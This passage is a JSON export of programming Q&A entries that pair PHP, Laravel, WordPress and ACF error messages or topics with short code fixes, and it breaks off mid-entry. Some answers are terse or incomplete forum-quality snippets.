    "title": " Too few arguments to function Illuminate\\Routing\\PendingResourceRegistration::name(), 1 passed in D:\\xampp\\htdocs\\routes\\web.php on line 30 and exactly 2 expected",
    "description": "i was using resource route and defining it with namespace either use get, post   or other route seperatly or you can use the below solution.  The solution is to change your route to:  Route::resource('siswa', 'SiswaController')->name('*', 'siswa') This may come very late but I've just encountered the same error. The error occurs because when we use Route::resource, Laravel expects 2 parameters instead of just 1. Example, in your:  Route::resource('siswa', 'SiswaController')->name('siswa') you only defined name. Hence, Laravel has defined the route 'siswa' for you.  But because you are using Route::resource, there are many routes that are defined in there, such as create, edit, delete and so on. So Laravel needs to define the routes as 'siswa.create', 'siswa.delete', and so on. Naturally, we cannot be expected to list out all of the methods, so putting a * helps Laravel understand that it should be creating the named routes as siswa.* and the * represents all of the different methods(e.g. create,edit, delete and so on). Hope this helped!\n",
    "reg_date": "2021-10-12T10:12:30.000Z"
  },
  {
    "id": 294,
    "keyword": null,
    "link": null,
    "title": " TreeBuilder::getRootNode()\" before creating the root node is not supported, migrate to the new constructor signature instead.",
    "description": "$treeBuilder = new TreeBuilder('bundle_id'); $rootNode = method_exists(TreeBuilder::class, 'getRootNode') ? $treeBuilder->getRootNode() : $treeBuilder->root('bundle_id');\n",
    "reg_date": "2021-10-12T10:12:30.000Z"
  },
  {
    "id": 295,
    "keyword": null,
    "link": null,
    "title": " Trying to access array offset on value of type int DefaultValueBinder.php on line 82",
    "description": "/* \tIf you are having this issue with Opencart's export / import extension:          Trying to access array offset on value of type int in ../../../system/library/export_import/Classes/PHPExcel/Cell/DefaultValueBinder.php on line 82          Then you need to open the file (DefaultValueBinder.php) and replace line 82 as follows: */  // OLD Line: // } elseif ($pValue[0] === '=' && strlen($pValue) > 1) { // NEW Line: } elseif (0 === strpos($pValue, '=') && strlen($pValue) > 1) {    // That's it... Happy coding, my homies <3\n",
    "reg_date": "2021-10-12T10:12:30.000Z"
  },
  {
    "id": 296,
    "keyword": null,
    "link": null,
    "title": " Trying to access array offset on value of type int in /system/library/export import/Classes/PHPExcel/Cell/DefaultValueBinder.php on line 82",
    "description": "/* \tIf you are having this issue with Opencart's export / import extension:          Trying to access array offset on value of type int in ../../../system/library/export_import/Classes/PHPExcel/Cell/DefaultValueBinder.php on line 82          Then you need to open the file (DefaultValueBinder.php) and replace line 82 as follows: */  // OLD Line: // } elseif ($pValue[0] === '=' && strlen($pValue) > 1) { // NEW Line: } elseif (0 === strpos($pValue, '=') && strlen($pValue) > 1) {    // That's it... Happy coding, my homies <3\n# go to Classes/Cell/DefaultValueBinder.php # and replace line 82 } elseif (0 === strpos($pValue, '=') && strlen($pValue) > 1) {\n",
    "reg_date": "2021-10-12T10:12:30.000Z"
  },
  {
    "id": 297,
    "keyword": null,
    "link": null,
    "title": " Unable to call component method. Public method [gotoPage] not found on component",
    "description": "//You need use the use WithPagination;  use Livewire\\WithPagination; class ChamadoList extends Component {     use WithPagination;     //... }\n",
    "reg_date": "2021-10-12T10:12:30.000Z"
  },
  {
    "id": 298,
    "keyword": null,
    "link": null,
    "title": " Unable to call component method",
    "description": "//You need use the use WithPagination;  use Livewire\\WithPagination; class ChamadoList extends Component {     use WithPagination;     //... }\n",
    "reg_date": "2021-10-12T10:12:31.000Z"
  },
  {
    "id": 299,
    "keyword": null,
    "link": null,
    "title": " Unable to resolve NULL driver for [Maatwebsite\\Excel\\Transactions\\TransactionManager].",
    "description": "//Laravel cache was on the way of the package reading the new published vendor config.  php artisan config:clear \n",
    "reg_date": "2021-10-12T10:12:31.000Z"
  },
  {
    "id": 300,
    "keyword": null,
    "link": null,
    "title": " Uncaught Error: Class 'Illuminate\\Foundation\\Application' in laravel bootstrap",
    "description": "composer update --no-scripts cd bootstrap/cache/->rm -rf *.php composer dump-autoload \n",
    "reg_date": "2021-10-12T10:12:31.000Z"
  },
  {
    "id": 301,
    "keyword": null,
    "link": null,
    "title": " Uncaught SyntaxError: Invalid shorthand property initializer",
    "description": "//change {asdf = sdfjksf} // to {asdf: sdfjksf}\nRemember, you playin with javascript now, not php :)\n",
    "reg_date": "2021-10-12T10:12:31.000Z"
  },
  {
    "id": 302,
    "keyword": null,
    "link": null,
    "title": " Undefined index: HTTP HOST",
    "description": "/* When a request is done with an empty host:  GET / HTTP/1.1 Host: Then isset($_SERVER['HTTP_HOST']) is true!  It is better to use empty like:*/  $host = ''; if (!empty($_SERVER['HTTP_HOST'])) {   $host = $_SERVER['HTTP_HOST']; }\n",
    "reg_date": "2021-10-12T10:12:31.000Z"
  },
  {
    "id": 303,
    "keyword": null,
    "link": null,
    "title": " Undefined index: gross wt in C:\\xampp\\htdocs\\aezaz\\Dev\\login\\pdf export\\gb1.php on line 34",
    "description": "$name = isset($_POST['name']) ? $_POST['name'] : ''; if (isset($_POST['submit']) && $human == '4') {   \n",
    "reg_date": "2021-10-12T10:12:31.000Z"
  },
  {
    "id": 304,
    "keyword": null,
    "link": null,
    "title": " Unresolvable dependency resolving [Parameter #0",
    "description": "php artisan optimize:clear\n",
    "reg_date": "2021-10-12T10:12:31.000Z"
  },
  {
    "id": 305,
    "keyword": null,
    "link": null,
    "title": " Upload image laravel 6",
    "description": "<?php   namespace App\\Http\\Controllers\\simple_image_upload;   use Illuminate\\Http\\Request; use App\\Http\\Controllers\\Controller; use Validator,Redirect,Response,File; use App\\Photo;   class ImageUploadController extends Controller {     //     public function index()     {         return view('simple_image_upload.index');     }       public function store(Request $request)     {        request()->validate([             'profile_image' => 'required|image|mimes:jpeg,png,jpg,gif,svg|max:2048',        ]);        if ($files = $request->file('profile_image')) {        // Define upload path            $destinationPath = public_path('/profile_images/'); // upload path  // Upload Orginal Image                       $profileImage = date('YmdHis') . \".\" . $files->getClientOriginalExtension();            $files->move($destinationPath, $profileImage);              $insert['image'] = \"$profileImage\";         // Save In Database  $imagemodel= new Photo();  $imagemodel->photo_name=\"$profileImage\";  $imagemodel->save();         }         return back()->with('success', 'Image Upload successfully');       } } \n",
    "reg_date": "2021-10-12T10:12:31.000Z"
  },
  {
    "id": 306,
    "keyword": null,
    "link": null,
    "title": " WC Product",
    "description": "// Get the instance of the WC_Product Object $product = wc_get_product( $product_id);  // Using `WC_Product` methods examples to get specific related data values:  $product_type  = $product->get_type(); // product Type $product_id    = $product->get_id(); // product ID $product_name  = $product->get_name(); // product name $product_sku   = $product->get_sku(); // product SKU $product_price = $product->get_price(); // product price  // And so on&hellip;  // The raw display of the object protected data (Just for testing) echo '<pre>'; print_r( $product ); echo '</pre>';\n",
    "reg_date": "2021-10-12T10:12:31.000Z"
  },
  {
    "id": 307,
    "keyword": null,
    "link": null,
    "title": " WP Uploads Media Path",
    "description": "update_option('upload_url_path', '/wp-content/uploads'); src=\"/wp-content/uploads/file.jpg\"\n",
    "reg_date": "2021-10-12T10:12:32.000Z"
  },
  {
    "id": 308,
    "keyword": null,
    "link": null,
    "title": " Warning: Cannot modify header information - headers already sent by (output started at C:\\xampp\\htdocs\\heermatka\\myprofile.php:48) in C:\\xampp\\htdocs\\heermatka\\myprofile.php on line 144",
    "description": "ob_start(); Please paste top on the page.\n",
    "reg_date": "2021-10-12T10:12:32.000Z"
  },
  {
    "id": 309,
    "keyword": null,
    "link": null,
    "title": " Warning: Use of undefined constant vNumber - assumed 'vNumber' (this will throw an Error in a future version of PHP) in C:\\xampp\\htdocs\\HelloWorld\\vorbereitung.php on line 112",
    "description": "echo $_POST[\"email\"]; \n",
    "reg_date": "2021-10-12T10:12:32.000Z"
  },
  {
    "id": 310,
    "keyword": null,
    "link": null,
    "title": " Warning: func get arg() expects exactly 1 parameter, 0 given in",
    "description": "  $func_data = array();   for($i = 0;$i < func_num_args();$i++)   {     array_push($func_data,func_get_arg($i));   }\n",
    "reg_date": "2021-10-12T10:12:32.000Z"
  },
  {
    "id": 311,
    "keyword": null,
    "link": null,
    "title": " Warning: get browser(): browscap ini directive not set in",
    "description": ";browscap = \"C:\\wamp\\bin\\php\\php5.4.12\\php_browscap.ini\" ^---- comment/disable\n",
    "reg_date": "2021-10-12T10:12:32.000Z"
  },
  {
    "id": 312,
    "keyword": null,
    "link": null,
    "title": " Warning: mysqli error() expects exactly 1 parameter, 0",
    "description": "Change  die (mysqli_error());  to  die('Error: ' . mysqli_error($myConnection)); in the query  $query = mysqli_query($myConnection, $sqlCommand) or die (mysqli_error()); \n",
    "reg_date": "2021-10-12T10:12:32.000Z"
  },
  {
    "id": 313,
    "keyword": null,
    "link": null,
    "title": " Warning: mysqli fetch all() expects parameter 1 to be mysqli result, bool given in C:\\newxammp\\htdocs\\learn\\index.php on line 11",
    "description": "#where you are running mysqli_query , add 'or die( mysqli_error($db)' #e.g $sql = \"SELECT * FROM users\"; $result = mysqli_query($db, $sql) or die( mysqli_error($db)); #$db being the variable holding the connection to db\n mysqli_fetch_array($query) \n",
    "reg_date": "2021-10-12T10:12:32.000Z"
  },
  {
    "id": 314,
    "keyword": null,
    "link": null,
    "title": " Warning: sprintf(): Too few arguments in /opt/lampp/htdocs/wordpress/wp-admin/includes/class-bulk-upgrader-skin.php on line 152",
    "description": " \t\tif ( $this->result && ! is_wp_error( $this->result ) ) { \t\t\tif ( ! $this->error ) \t\t\t\techo '<div class=\"updated\"><p>' . sprintf($this->upgrader->strings['skin_update_successful'], $title, 'jQuery(\\'#progress-' . esc_js($this->upgrader->update_current) . '\\').toggle();jQuery(\\'span\\', this).toggle(); return false;') . '</p></div>'; \t\t\t\t\techo '<script type=\"text/javascript\">jQuery(\\'.waiting-' . esc_js($this->upgrader->update_current) . '\\').hide();</script>'; \t\t}\n",
    "reg_date": "2021-10-12T10:12:32.000Z"
  },
  {
    "id": 315,
    "keyword": null,
    "link": null,
    "title": " What types of Array in php",
    "description": "In PHP, there are three types of arrays: Indexed arrays - Arrays with a numeric index. Associative arrays - Arrays with named keys. Multidimensional arrays - Arrays containing one or more arrays.\n",
    "reg_date": "2021-10-12T10:12:32.000Z"
  },
  {
    "id": 316,
    "keyword": null,
    "link": null,
    "title": " Windows:#",
    "description": "{   \"php.validate.executablePath\": \"c:/php/php.exe\" }\n",
    "reg_date": "2021-10-12T10:12:32.000Z"
  },
  {
    "id": 317,
    "keyword": null,
    "link": null,
    "title": " Woocommerce Display field value on the admin order edit page [Custom Field Display 2]",
    "description": "/**  * Display field value on the admin order edit page..  *  * PHP Custom Feild Value  *   *   */  add_action( 'woocommerce_admin_order_data_after_billing_address', 'my_custom_checkout_field_display_admin_order_meta', 10, 1 ); function my_custom_checkout_field_display_admin_order_meta($order){     echo '<p><strong>'.__('Store Location').':</strong> ' . get_post_meta( $order->id, 'My Field', true ) . '</p>'; } \n/**  * Update the order meta with field value  *  * PHP Custom Feild Value  *   *   */  add_action( 'woocommerce_checkout_update_order_meta', 'my_custom_checkout_field_update_order_meta' ); function my_custom_checkout_field_update_order_meta( $order_id ) {     if ( ! empty( $_POST['store_location'] ) ) {         update_post_meta( $order_id, 'My Field', sanitize_text_field( $_POST['store_location'] ) );     } }\n",
    "reg_date": "2021-10-12T10:12:33.000Z"
  },
  {
    "id": 318,
    "keyword": null,
    "link": null,
    "title": " Woocommerce password strength change",
    "description": "add_filter( 'woocommerce_min_password_strength', 'reduce_min_strength_password_requirement' ); function reduce_min_strength_password_requirement( $strength ) {     // 3 => Strong (default) | 2 => Medium | 1 => Weak | 0 => Very Weak (anything).     return 2;  }  # change the wording of the password hint. add_filter( 'password_hint', 'indic_password_hint' ); function indic_password_hint ( $hint ) {     $hint = 'Hint: To make it stronger, use upper and lower case letters, numbers, and symbols like ! \" ? $ % ^ & ).';     return $hint; }  # to remove password hint and strendth check function indic_remove_password_strength() {     wp_dequeue_script( 'wc-password-strength-meter' ); } add_action( 'wp_print_scripts', 'indic_remove_password_strength', 10 );\n",
    "reg_date": "2021-10-12T10:12:33.000Z"
  },
  {
    "id": 319,
    "keyword": null,
    "link": null,
    "title": " WordPress debug",
    "description": "// Enable WP_DEBUG mode define( 'WP_DEBUG', true );  // Enable Debug logging to the /wp-content/debug.log file define( 'WP_DEBUG_LOG', true );  // Disable display of errors and warnings define( 'WP_DEBUG_DISPLAY', false ); @ini_set( 'display_errors', 0 );  // Use dev versions of core JS and CSS files (only needed if you are modifying these core files) define( 'SCRIPT_DEBUG', true );\n// Enable WP_DEBUG mode define( 'WP_DEBUG', true );  // Enable Debug logging to the /wp-content/debug.log file define( 'WP_DEBUG_LOG', true );  // Disable display of errors and warnings define( 'WP_DEBUG_DISPLAY', false ); @ini_set( 'display_errors', 0 );\ndefine( 'WP_DEBUG', true ); \n// This enables debugging. define( 'WP_DEBUG', true );\n",
    "reg_date": "2021-10-12T10:12:33.000Z"
  },
  {
    "id": 320,
    "keyword": null,
    "link": null,
    "title": " Your requirements could not be resolved to an installable set of packages.",
    "description": "      composer install --ignore-platform-reqs  or      composer update --ignore-platform-reqs \n//Install Necessary PHP Extensions apt-get install php7.4-gmp  apt-get install php-curl sudo apt-get install php7.4-zip sudo apt-get install php-mbstring -y sudo apt-get install php-xml -y //Restart Apache Server sudo service apache2 restart\n",
    "reg_date": "2021-10-12T10:12:33.000Z"
  },
  {
    "id": 321,
    "keyword": null,
    "link": null,
    "title": "   construct",
    "description": " <?php class BaseClass {     function __construct() {         print \"In BaseClass constructor\\n\";     } }  class SubClass extends BaseClass {     function __construct() {         parent::__construct();         print \"In SubClass constructor\\n\";     } }  class OtherSubClass extends BaseClass {     // inherits BaseClass's constructor }  // In BaseClass constructor $obj = new BaseClass();  // In BaseClass constructor // In SubClass constructor $obj = new SubClass();  // In BaseClass constructor $obj = new OtherSubClass(); ?>  \n__construct ([ mixed $args = \"\" [, $... ]] ) : void\n",
    "reg_date": "2021-10-12T10:12:33.000Z"
  },
  {
    "id": 322,
    "keyword": null,
    "link": null,
    "title": "   dir   in php",
    "description": "PHP scripts run relative to the current path (result of getcwd()),  not to the path of their own file.  Using __DIR__ forces the include to happen relative to their own path. CORRECT: in file2.php: include (__DIR__ . \"/file3.php\"); To demonstrate: - file1.php - dir/    - file2.php    - file3.php If file2.php includes file3.php like this: include `file3.php`. It will work fine if you call file2.php directly.  However, if file1.php includes file2.php,  the current directory (getcwd()), will be wrong for file2.php,  so file3.php cannot be included.\n<?php include __DIR__ . \"/worker_2.php\";\n",
    "reg_date": "2021-10-12T10:12:33.000Z"
  },
  {
    "id": 323,
    "keyword": null,
    "link": null,
    "title": " a backwards counting forloop",
    "description": "<?php // a array $weekday = array(\"Monday\",\"Tuesday\",\"Wednesday\",\"Thursday\",\"Friday\",\"Saturday\", \"Sunday\"); // the for loop for($i = 6; $i >= 0; $i = $i -1){      print ( \"$weekday[$i]<br>\" ); } ?>\nvar myArray = []; for (var i = 9; i > 0; i -= 2){     myArray.push(i); } console.log(myArray); // console output [ 9, 7, 5, 3, 1 ]\n",
    "reg_date": "2021-10-12T10:12:33.000Z"
  },
  {
    "id": 324,
    "keyword": null,
    "link": null,
    "title": " a non well formed numeric value encountered",
    "description": "// when working with datetime php got below error,  A non well formed numeric value encountered  // please add strtotime  // your code => date('H:i', '10:00');  // INCORRECT  // date('H:i', strtotime('10:00'))); // CORRECT (add strtotime)   \n",
    "reg_date": "2021-10-12T10:12:33.000Z"
  },
  {
    "id": 325,
    "keyword": null,
    "link": null,
    "title": " a php session was created by a session start()",
    "description": "if ( !session_id() ) {     session_start( [         'read_and_close' => true,     ] ); } \n <?php // This sends a persistent cookie that lasts a day. session_start([     'cookie_lifetime' => 86400, ]); ?>  \n",
    "reg_date": "2021-10-12T10:12:33.000Z"
  },
  {
    "id": 326,
    "keyword": null,
    "link": null,
    "title": " absolute path php",
    "description": "# C:\\Users\\Redacted\\Desktop\\main.php include __DIR__ . DIRECTORY_SEPARATOR . 'include.php'; echoScriptPath();  # C:\\Users\\Redacted\\Desktop\\include.php function echoScriptPath() {     list($scriptPath) = get_included_files();     echo 'The script being executed is ' . $scriptPath; }\n// File in htdocs MAMP echo getcwd(); //Users/Example/Applications/MAMP/htdocs\nSplFileInfo.  $path = new SplFileInfo(__FILE__); echo 'The real path is '.$path->getRealPath();\n",
    "reg_date": "2021-10-12T10:12:33.000Z"
  },
  {
    "id": 327,
    "keyword": null,
    "link": null,
    "title": " abstract function php",
    "description": "abstract class absclass { // mark the entire class abstract     abstract public function fuc(); }\n",
    "reg_date": "2021-10-12T10:12:34.000Z"
  },
  {
    "id": 328,
    "keyword": null,
    "link": null,
    "title": " access config variable in codeigniter controller",
    "description": "// config.php $config['foo'] = 'bar';  // controller $this->config->item('foo');\n",
    "reg_date": "2021-10-12T10:12:34.000Z"
  },
  {
    "id": 329,
    "keyword": null,
    "link": null,
    "title": " access json with php",
    "description": "//Json Encode  $person = array(      \"name\" => \"KINGASV\",      \"title\" => \"CTO\" );  $personJSON=json_encode($person);//returns JSON string  //Json Decode  $personJSON = '{\"name\":\"KINGASV\",\"title\":\"CTO\"}';  $person = json_decode($personJSON);  echo $person->name; // KINGASV \n<?php   // JSON string   $someJSON = '[{\"name\":\"Jonathan Suh\",\"gender\":\"male\"},{\"name\":\"William Philbin\",\"gender\":\"male\"},{\"name\":\"Allison McKinnery\",\"gender\":\"female\"}]';    // Convert JSON string to Object   $someObject = json_decode($someJSON);   echo $someObject[0]->name; // Access Object data ?> \n<?php  $data = '{ \t\"name\": \"Aragorn\", \t\"race\": \"Human\" }';  $character = json_decode($data); echo $character->name;\n",
    "reg_date": "2021-10-12T10:12:34.000Z"
  },
  {
    "id": 330,
    "keyword": null,
    "link": null,
    "title": " access storage from the view laravel 6",
    "description": "  <img src=\"{{ asset('storage/images/'.$article->image) }}\" alt=\"\" title=\"\"></a> \n",
    "reg_date": "2021-10-12T10:12:34.000Z"
  },
  {
    "id": 331,
    "keyword": null,
    "link": null,
    "title": " access to this resource on the server is denied laravel",
    "description": "Create and put this .htaccess file in your laravel installation(root) folder.  <IfModule mod_rewrite.c>     RewriteEngine on     RewriteCond %{REQUEST_URI} !^public     RewriteRule ^(.*)$ public/$1 [L] </IfModule>\n",
    "reg_date": "2021-10-12T10:12:34.000Z"
  },
  {
    "id": 332,
    "keyword": null,
    "link": null,
    "title": " acf auto increment field",
    "description": "<?php function wfp_documents_setup_id_incr() {      // Check if user has rights to set it up and ACF is enabled.     if (current_user_can('administrator') && function_exists('get_field')):          // Initial value         // === YOU NEED TO UPDATE HERE ===         // Replace <code>custom_invoice_id</code> with your desired id name.         add_option('custom_invoice_id', '0001', '', 'yes');          /**          * Wrapper to get the id (if i would need to add something to it)          * @return mixed|void &ndash; stored next available id          */         function wfp_get_current_invoice_id()         {             return get_option('custom_invoice_id');         }          /**          * Count up the id by one and update the globally stored id          */         function wfp_increase_invoice_id()         {             $curr_invoice_id    = get_option('custom_invoice_id');             $next_invoice_id    = intval($curr_invoice_id) + 1;             update_option('custom_invoice_id', $next_invoice_id);         }          /**          * Populate the acf field when loading it.          */         function wfp_auto_get_current_document_id($value, $post_id, $field)         {             // If the custom field already has a value in it, just return this one (we don't want to overwrite it every single time)             if ($value !== null && $value !== \"\") {                 return $value;             }              // If the field is empty, get the currently stored next available id and fill it in the field.             $value = wfp_get_current_invoice_id();             return $value;         }          // Use ACF hooks to populate the field on load         // ==== YOU NEED TO UPDATE HERE ====         // Replace <code>invoice_id</code> with the name of your field.         add_filter('acf/load_value/name=invoice_id', 'wfp_auto_get_current_document_id', 10, 3);          /**          * Registers function to check if the globally stored id needs to be updated after a post is saved.          */         function wfp_acf_save_post($post_id)         {             // Check if the post had any ACF to begin with.             if (!isset($_POST['acf'])) {                 return;             }              $fields = $_POST['acf'];              // Only move to the next id when any ACF fields were added to that post, otherwise this might be an accident and would skip an id.             if ($_POST['_acf_changed'] == 0) {                 return;             }              // Next we need to find the field out id is stored in             foreach ($fields as $field_key => $value) {                 $field_object = get_field_object($field_key);                  /**                  * If we found our field and the value of that field is the same as our currently \"next available id\" &ndash;                  * we need to increase this id, so the next post doesn't use the same id.                  */                 if ($field_object['name'] == \"invoice_id\"                     && wfp_get_current_invoice_id() == $value) {                     wfp_increase_invoice_id();                      return;                 }             }         }          // Use a hook to run this function every time a post is saved.         add_action('acf/save_post', 'wfp_acf_save_post', 20);          /**          * The code below just displays the currently stored next id on an acf-options-page,          * so it's easy to see which id you're on. The field is disabled to prevent easy tinkering with the id.          */         function wfp_load_current_document_ids_settingspage($value, $postid, $field)         {             if ($field['name'] == \"document_ids-group_current_invoice_id\") {                 return wfp_get_current_invoice_id();             }             return $value;         }          function wfp_disable_acf_field($field)         {             $field['disabled'] = 1;              return $field;         }          add_filter('acf/load_field/name=current_invoice_id', 'wfp_disable_acf_field', 10, 3);         add_filter('acf/load_value/name=current_invoice_id', 'wfp_load_current_document_ids_settingspage', 10, 3);      endif; }  add_action('init', 'wfp_documents_setup_id_incr'); ?>\n",
    "reg_date": "2021-10-12T10:12:34.000Z"
  },
  {
    "id": 333,
    "keyword": null,
    "link": null,
    "title": " acf create option page",
    "description": "if( function_exists('acf_add_options_page') ) { \tacf_add_options_page(array( \t\t'page_title' \t=> 'Theme General Settings', \t\t'menu_title'\t=> 'Theme Settings', \t\t'menu_slug' \t=> 'theme-general-settings', \t\t'capability'\t=> 'edit_posts', \t\t'redirect'\t\t=> false \t)); \tacf_add_options_sub_page(array( \t\t'page_title' \t=> 'Theme Header Settings', \t\t'menu_title'\t=> 'Header', \t\t'parent_slug'\t=> 'theme-general-settings', \t)); }\n",
    "reg_date": "2021-10-12T10:12:34.000Z"
  },
  {
    "id": 334,
    "keyword": null,
    "link": null,
    "title": " acf gallery",
    "description": "<?php  $images = get_field('gallery');  if( $images ): ?>     <ul>         <?php foreach( $images as $image ): ?>             <li>                 <a href=\"<?php echo $image['url']; ?>\">                      <img src=\"<?php echo $image['sizes']['thumbnail']; ?>\" alt=\"<?php echo $image['alt']; ?>\" />                 </a>                 <p><?php echo $image['caption']; ?></p>             </li>         <?php endforeach; ?>     </ul> <?php endif; ?>\n<?php  $images = get_field('gallery'); $size = 'full'; // (thumbnail, medium, large, full or custom size) if( $images ): ?>     <ul>         <?php foreach( $images as $image_id ): ?>             <li>                 <?php echo wp_get_attachment_image( $image_id, $size ); ?>             </li>         <?php endforeach; ?>     </ul> <?php endif; ?>\n",
    "reg_date": "2021-10-12T10:12:34.000Z"
  },
  {
    "id": 335,
    "keyword": null,
    "link": null,
    "title": " acf get field",
    "description": "$content = get_field('content', $post_id);\n$value = get_field( \"text_field\" );  if( $value ) {     echo $value; } else {     echo 'empty'; }\nget_field($selector, [$post_id], [$format_value]); /* $selector (string) (Required) The field name or field key. $post_id (mixed) (Optional) The post ID where the value is saved. Defaults to the current post. $format_value (bool) (Optional) Whether to apply formatting logic. Defaults to true. */ // Get a value from the current post $value = get_field( \"text_field\" ); // Get a value from a specific post $value = get_field( \"field_name\", $post_id );\n",
    "reg_date": "2021-10-12T10:12:34.000Z"
  },
  {
    "id": 336,
    "keyword": null,
    "link": null,
    "title": " acf get sub field",
    "description": "if( have_rows('parent_field') ):     while ( have_rows('parent_field') ) : the_row();         $sub_value = get_sub_field('sub_field');         // Do something...     endwhile; else :     // no rows found endif;\n",
    "reg_date": "2021-10-12T10:12:34.000Z"
  },
  {
    "id": 337,
    "keyword": null,
    "link": null,
    "title": " acf get user form field",
    "description": "<?php  //This example will retrieve a field value from a user with an ID of 1.  $variable = get_field('field_name', 'user_1');  // do something with $variable  ?>\n",
    "reg_date": "2021-10-12T10:12:34.000Z"
  },
  {
    "id": 338,
    "keyword": null,
    "link": null,
    "title": " acf meta field query",
    "description": "$posts = get_posts(array( \t'numberposts'\t=> -1, \t'post_type'\t\t=> 'post', \t'meta_query'\t=> array( \t\t'relation'\t\t=> 'AND', \t\tarray( \t\t\t'key'\t \t=> 'color', \t\t\t'value'\t  \t=> array('red', 'orange'), \t\t\t'compare' \t=> 'IN', \t\t), \t\tarray( \t\t\t'key'\t  \t=> 'featured', \t\t\t'value'\t  \t=> '1', \t\t\t'compare' \t=> '=', \t\t), \t), ));  // args $args = array( \t'numberposts'\t=> -1, \t'post_type'\t\t=> 'event', \t'meta_key'\t\t=> 'location', \t'meta_value'\t=> 'Melbourne' );   // query $the_query = new WP_Query( $args );  ?> <?php if( $the_query->have_posts() ): ?> \t<ul> \t<?php while( $the_query->have_posts() ) : $the_query->the_post(); ?> \t\t<li> \t\t\t<a href=\"<?php the_permalink(); ?>\"> \t\t\t\t<img src=\"<?php the_field('event_thumbnail'); ?>\" /> \t\t\t\t<?php the_title(); ?> \t\t\t</a> \t\t</li> \t<?php endwhile; ?> \t</ul> <?php endif; ?>  <?php wp_reset_query();\t // Restore global post data stomped by the_post(). ?>\n",
    "reg_date": "2021-10-12T10:12:35.000Z"
  },
  {
    "id": 339,
    "keyword": null,
    "link": null,
    "title": " acf options page",
    "description": "if( function_exists('acf_add_options_page') ) { \t \tacf_add_options_page(); \t }\n",
    "reg_date": "2021-10-12T10:12:35.000Z"
  },
  {
    "id": 340,
    "keyword": null,
    "link": null,
    "title": " acf post object",
    "description": "<?php  // DISPLAY CONTENT FOR SINGLE POST OBJECT  $post_object = get_field('post_object');  if( $post_object ):   \t// override $post \t$post = $post_object; \tsetup_postdata( $post );   \t?>     <div>     \t<h3><a href=\"<?php the_permalink(); ?>\"><?php the_title(); ?></a></h3>     \t<span>Post Object Custom Field: <?php the_field('field_name'); ?></span>     </div>     <?php wp_reset_postdata(); // IMPORTANT - reset the $post object so the rest of the page works correctly ?> <?php endif; ?>\n<?php  // DISPLAY DATA FOR MULTIPLE POST OBJECTS  /* *  Loop through post objects (assuming this is a multi-select field) ( setup postdata ) *  Using this method, you can use all the normal WP functions as the $post object is temporarily initialized within the loop *  Read more: http://codex.wordpress.org/Template_Tags/get_posts#Reset_after_Postlists_with_offset */  $post_objects = get_field('post_objects');  if( $post_objects ): ?>     <ul>     <?php foreach( $post_objects as $post): // variable must be called $post (IMPORTANT) ?>         <?php setup_postdata($post); ?>         <li>             <a href=\"<?php the_permalink(); ?>\"><?php the_title(); ?></a>             <span>Post Object Custom Field: <?php the_field('field_name'); ?></span>         </li>     <?php endforeach; ?>     </ul>     <?php wp_reset_postdata(); // IMPORTANT - reset the $post object so the rest of the page works correctly ?> <?php endif;  /* *  Loop through post objects (assuming this is a multi-select field) ( don't setup postdata ) *  Using this method, the $post object is never changed so all functions need a seccond parameter of the post ID in question. */  $post_objects = get_field('post_objects');  if( $post_objects ): ?>     <ul>     <?php foreach( $post_objects as $post_object): ?>         <li>             <a href=\"<?php echo get_permalink($post_object->ID); ?>\"><?php echo get_the_title($post_object->ID); ?></a>             <span>Post Object Custom Field: <?php the_field('field_name', $post_object->ID); ?></span>         </li>     <?php endforeach; ?>     </ul> <?php endif;  ?>\n",
    "reg_date": "2021-10-12T10:12:35.000Z"
  },
  {
    "id": 341,
    "keyword": null,
    "link": null,
    "title": " acf repeater",
    "description": "<?php  // ACF REPEATER - BASIC LOOP  // check if the repeater field has rows of data if( have_rows('repeater_field_name') ):   \t// loop through the rows of data     while ( have_rows('repeater_field_name') ) : the_row();          // display a sub field value         the_sub_field('sub_field_name');      endwhile;  else :      // no rows found  endif;  ?>\n<?php if( have_rows('repeater_field_name') ):  \twhile( have_rows('repeater_field_name') ): the_row();  \t\t$image = get_sub_field('image'); \tendwhile; endif; ?>\n<?php if( have_rows('repeater_field_name') ): ?>  \t<ul class=\"slides\">  \t<?php while( have_rows('repeater_field_name') ): the_row();   \t\t// vars \t\t$image = get_sub_field('image'); \t\t$content = get_sub_field('content'); \t\t$link = get_sub_field('link');  \t\t?>  \t\t<li class=\"slide\">  \t\t\t<?php if( $link ): ?> \t\t\t\t<a href=\"<?php echo $link; ?>\"> \t\t\t<?php endif; ?>  \t\t\t\t<img src=\"<?php echo $image['url']; ?>\" alt=\"<?php echo $image['alt'] ?>\" />  \t\t\t<?php if( $link ): ?> \t\t\t\t</a> \t\t\t<?php endif; ?>  \t\t    <?php echo $content; ?>  \t\t</li>  \t<?php endwhile; ?>  \t</ul>  <?php endif; ?>\n<?php  $rows = get_field('repeater_field_name'); if( $rows ) {     echo '<ul class=\"slides\">';     foreach( $rows as $row ) {         $image = $row['image'];         echo '<li>';             echo wp_get_attachment_image( $image, 'full' );             echo wpautop( $row['caption'] );         echo '</li>';     }     echo '</ul>'; }\n<?php   $rows = get_field('repeater_field_name'); if($rows) { \techo '<ul>';  \tforeach($rows as $row) \t{ \t\techo '<li>sub_field_1 = ' . $row['sub_field_1'] . ', sub_field_2 = ' . $row['sub_field_2'] .', etc</li>'; \t}  \techo '</ul>'; }\n// ACF REPATER - ADVANCED LOOP  <?php if( have_rows('repeater_field_name') ): ?>  \t<ul class=\"slides\">  \t<?php while( have_rows('repeater_field_name') ): the_row();   \t\t// vars \t\t$image = get_sub_field('image'); \t\t$content = get_sub_field('content'); \t\t$link = get_sub_field('link');  \t\t?>  \t\t<li class=\"slide\">  \t\t\t<?php if( $link ): ?> \t\t\t\t<a href=\"<?php echo $link; ?>\"> \t\t\t<?php endif; ?>  \t\t\t\t<img src=\"<?php echo $image['url']; ?>\" alt=\"<?php echo $image['alt'] ?>\" />  \t\t\t<?php if( $link ): ?> \t\t\t\t</a> \t\t\t<?php endif; ?>  \t\t    <?php echo $content; ?>  \t\t</li>  \t<?php endwhile; ?>  \t</ul>  <?php endif; ?>\n",
    "reg_date": "2021-10-12T10:12:35.000Z"
  },
  {
    "id": 342,
    "keyword": null,
    "link": null,
    "title": " acf repeater example count",
